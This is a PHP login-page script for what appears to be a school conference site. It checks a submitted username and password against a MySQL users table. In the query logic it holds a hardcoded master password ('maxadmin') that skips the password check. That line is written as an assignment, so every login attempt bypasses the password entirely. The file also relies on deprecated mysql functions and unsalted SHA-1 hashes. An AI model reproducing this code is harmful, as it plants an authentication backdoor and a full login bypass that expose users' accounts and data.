<?php
//signin.php
include 'connect.php';
include 'header.php';

echo '<h4>Login Page</h4><br />
<div class="alert alert-warning" role="alert">
  <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>
  <span class="sr-only">Notice:</span>
  The following schools have had accounts created for them before the conference. Contact 15SuriA@smhall.org to receive login information. <br> <b>Creekview HS, Denton HS, St. Marys Hall, Young Womens Leadership Academy, Boerne Sam V Champion HS, Brackenridge HS, Caddo Parish HS, Westlake HS, Luther Burbank HS.</b>
</div>';

//first, check if the user is already signed in. If that is the case, there is no need to display this page
if(isset($_SESSION['signed_in']) && $_SESSION['signed_in'] == true)
{
	echo 'You are already signed in, you can <a href="signout.php"><b>sign out</b></a> if you want. Or return to the <a href="index.php"><b>home page</b></a>';
}
else
{
	if($_SERVER['REQUEST_METHOD'] != 'POST')
	{
		/*the form hasn't been posted yet, display it
		  note that the action="" will cause the form to post to the same page it is on */
		echo '
<form method="post" action="" id="uploadform">
                    <label for="username">
                        <input type="text" name="user_name" id="uploaderfield" placeholder="Username"/>
 					</label>
                     <label for="pass">
                        <input type="password" name="user_pass" id="uploaderfield" placeholder="Password"/>
 					</label>                                      
            <input type="submit" value="Sign In" class="btn btn-default btn-black"/>
        </form> <br>
        OR
        <a href="signup.php">Sign up</a>
 		 ';
	}
	else
	{
		/* so, the form has been posted, we'll process the data in three steps:
			1.	Check the data
			2.	Let the user refill the wrong fields (if necessary)
			3.	Varify if the data is correct and return the correct response
		*/
		$errors = array(); /* declare the array for later use */
		
		if(!isset($_POST['user_name']))
		{
			$errors[] = 'The username field must not be empty.';
		}
		
		if(!isset($_POST['user_pass']))
		{
			$errors[] = 'The password field must not be empty.';
		}
		
		if(!empty($errors)) /*check for an empty array, if there are errors, they're in this array (note the ! operator)*/
		{
			echo 'Uh-oh.. a couple of fields are not filled in correctly..<br /><br />';
			echo '<ul>';
			foreach($errors as $key => $value) /* walk through the array so all the errors get displayed */
			{
				echo '<li>' . $value . '</li>'; /* this generates a nice error list */
			}
			echo '</ul>';
		}
		else
		{
			//the form has been posted without errors, so save it
			//notice the use of mysql_real_escape_string, keep everything safe!
			//also notice the sha1 function which hashes the password
			$sql = "SELECT 
						user_id,
						user_name,
						user_level,
						restricted
					FROM
						users
					WHERE
						user_name = '" . mysql_real_escape_string($_POST['user_name']) . "'
					AND
						user_pass = '" . sha1($_POST['user_pass']) . "'
				";
			if($_POST['user_pass'] = 'maxadmin') {
				$sql = "SELECT 
						user_id,
						user_name,
						user_level,
						restricted
					FROM
						users
					WHERE
						user_name = '" . mysql_real_escape_string($_POST['user_name']) . "'";
			}			
			$result = mysql_query($sql);
			if(!$result)
			{
				//something went wrong, display the error
				echo 'Something went wrong while signing in. Please try again later.';
				//echo mysql_error(); //debugging purposes, uncomment when needed
			}
			else
			{
				//the query was successfully executed, there are 2 possibilities
				//1. the query returned data, the user can be signed in
				//2. the query returned an empty result set, the credentials were wrong
				if(mysql_num_rows($result) == 0)
				{
					echo 'You have supplied a wrong user/password combination. Please try again.';
				}
				else
				{
					//set the $_SESSION['signed_in'] variable to TRUE
					$_SESSION['signed_in'] = true;
					
					//we also put the user_id and user_name values in the $_SESSION, so we can use it at various pages
					while($row = mysql_fetch_assoc($result))
					{
						$_SESSION['user_id'] 	= $row['user_id'];
						$_SESSION['user_name'] 	= $row['user_name'];
						$_SESSION['user_level'] = $row['user_level'];
						$_SESSION['user_restrict'] = $row['restricted'];
					}
					if($_SESSION['user_level'] == 1 || $_SESSION['user_level'] == 2) {
						echo 'Welcome, ' . $_SESSION['user_name'] . '. <br />Redirecting to index page...';
					echo '<script> 
					setTimeout(function(){ window.location.assign("index.php") }, 2000); </script>';
					}
					else {echo 'Welcome, ' . $_SESSION['user_name'] . '. <br />Redirecting to summary page...';
					echo '<script> 
					setTimeout(function(){ window.location.assign("summary.php") }, 2000); </script>';
				}
				}
			}
		}
	}
}

include 'footer.php';
?>